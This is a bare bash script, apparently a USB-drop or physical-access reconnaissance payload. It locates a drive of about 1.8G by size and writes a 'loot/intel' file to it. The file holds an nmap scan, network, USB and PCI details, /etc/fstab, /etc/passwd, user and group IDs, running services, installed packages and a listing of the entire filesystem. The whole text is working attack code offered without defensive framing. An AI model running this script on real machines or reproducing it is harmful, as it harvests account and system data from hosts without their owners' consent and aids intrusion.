lol=$(lsblk | grep 1.8G)
disk=$(echo $lol | awk '{print $1}')
mntt=$(lsblk | grep $disk | awk '{print $7}')
echo -e "*******************************************" >> $mntt/loot/intel
echo "Network Schema:" >> $mntt/loot/intel
echo -e "*******************************************" >> $mntt/loot/intel
echo -e "\n" >> $mntt/loot/intel
nmap -sV localhost >> $mntt/loot/intel
echo -e "\n" >> $mntt/loot/intel 
echo -e "*******************************************" >> $mntt/loot/intel 
echo "Network Interfaces:" >> $mntt/loot/intel
echo -e "*******************************************" >> $mntt/loot/intel
ifconfig >> $mntt/loot/intel
echo -e "\n" >> $mntt/loot/intel 
ip addr >> $mntt/loot/intel
echo -e "\n" >> $mntt/loot/intel 
iwconfig >> $mntt/loot/intel
echo -e "\n" >> $mntt/loot/intel 
echo -e "*******************************************" >> $mntt/loot/intel 
echo Storage Info: >> $mntt/loot/intel
echo -e "*******************************************" >> $mntt/loot/intel
findmnt >> $mntt/loot/intel
echo -e "\n" >> $mntt/loot/intel 
cat /etc/fstab >> $mntt/loot/intel
echo -e "\n" >> $mntt/loot/intel 
echo -e "*******************************************" >> $mntt/loot/intel 
echo "USB Info:" >> $mntt/loot/intel 
echo -e "*******************************************" >> $mntt/loot/intel
lsusb -v >> $mntt/loot/intel
echo -e "\n" >> $mntt/loot/intel 
echo -e "*******************************************" >> $mntt/loot/intel 
echo "PCI Info:" >> $mntt/loot/intel
echo -e "*******************************************" >> $mntt/loot/intel
lspci -vvv >> $mntt/loot/intel
echo -e "\n" >> $mntt/loot/intel 
echo -e "*******************************************" >> $mntt/loot/intel 
echo "CPU Info:" >> $mntt/loot/intel
echo -e "*******************************************" >> $mntt/loot/intel
lscpu >> $mntt/loot/intel
echo -e "\n" >> $mntt/loot/intel 
echo -e "*******************************************" >> $mntt/loot/intel 
echo "Systemd services:" >> $mntt/loot/intel
echo -e "*******************************************" >> $mntt/loot/intel
systemctl list-units >> $mntt/loot/intel
echo -e "\n" >> $mntt/loot/intel 
echo -e "*******************************************" >> $mntt/loot/intel 
echo User/groups: >> $mntt/loot/intel
echo -e "*******************************************" >> $mntt/loot/intel
id >> $mntt/loot/intel 
echo -e "\n" >> $mntt/loot/intel 
cat /etc/passwd >> $mntt/loot/intel
echo -e "\n" >> $mntt/loot/intel 
echo -e "*******************************************" >> $mntt/loot/intel 
echo "Installed packages:" >> $mntt/loot/intel
echo -e "*******************************************" >> $mntt/loot/intel
pacman -Q >> $mntt/loot/intel || apt list --installed >> $mntt/loot/intel || dpkg -l >> $mntt/loot/intel || apk info >> $mntt/loot/intel || yum list installed >> $mntt/loot/intel || dnf list installed >> $mntt/loot/intel || zypper se --installed-only >> $mntt/loot/intel || rpm -qa >> $mntt/loot/intel
echo -e "\n" >> $mntt/loot/intel 
snap list >> $mntt/loot/intel
echo -e "\n" >> $mntt/loot/intel 
flatpak list --app >> $mntt/loot/intel
echo -e "\n" >> $mntt/loot/intel 
echo -e "******************************************" >> $mntt/loot/intel 
echo "Directory Structure:" >> $mntt/loot/intel
echo -e "*******************************************" >> $mntt/loot/intel
find * / >>  $mntt/loot/intel
echo -e "\n" >> $mntt/loot/intel 
echo -e "******************************************" >> $mntt/loot/intel 
